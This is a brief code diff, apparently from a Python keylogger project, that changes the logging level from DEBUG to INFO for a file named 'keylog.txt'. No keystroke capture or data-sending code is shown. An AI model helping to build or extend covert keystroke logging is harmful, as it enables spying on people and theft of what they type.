@@ -7,7 +7,7 @@ ctrl = Controller()
 log_dir = "/"
 logging.basicConfig(
     filename=("keylog.txt"),
-    level=logging.DEBUG,
+    level=logging.INFO,
     format='%(asctime)s: %(message)s'
 )
 
